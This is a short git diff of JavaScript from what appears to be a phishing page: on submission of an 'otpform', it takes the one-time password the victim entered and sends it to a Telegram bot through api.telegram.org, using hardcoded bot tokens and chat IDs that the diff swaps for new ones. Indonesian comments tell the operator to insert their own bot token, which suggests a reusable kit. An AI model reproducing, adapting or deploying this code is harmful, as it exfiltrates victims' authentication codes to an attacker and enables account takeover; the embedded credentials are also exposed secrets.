@@ -4,8 +4,8 @@ document.getElementById('otpform').addEventListener('submit', function(event) {
 
     const otp = document.getElementById('otp').value;
 
-    const token = '7686748052:AAHQe5nOPpzY2pA6BKpYlKMaje6g4j9B92k'; // Ganti dengan token bot Anda
-    const chatId = '7918927436'; // Ganti dengan ID chat Anda
+    const token = '7648378330:AAEAq0udVYtsHePwOsFOcpRVYSl1Ivnm5uI'; // Ganti dengan token bot Anda
+    const chatId = '6387471971'; // Ganti dengan ID chat Anda
 
     const text = `OTP: ${otp} `;
     const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
